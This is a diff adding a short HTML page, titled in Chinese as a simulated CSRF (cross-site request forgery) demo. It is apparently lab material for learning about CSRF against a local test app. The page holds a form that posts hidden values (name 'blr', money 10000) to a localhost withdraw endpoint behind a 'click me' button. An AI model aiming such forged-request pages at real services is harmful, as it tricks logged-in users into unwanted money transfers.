@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>模拟 CSRF 跨站请求伪造</title>
+</head>
+<body>
+
+<form action="http://localhost:8080/withdraw" method="post">
+  <input name="name" type="hidden" value="blr"/>
+  <input name="money" type="hidden" value="10000">
+  <input type="submit" value="点我">
+</form>
+
+</body>
+</html>
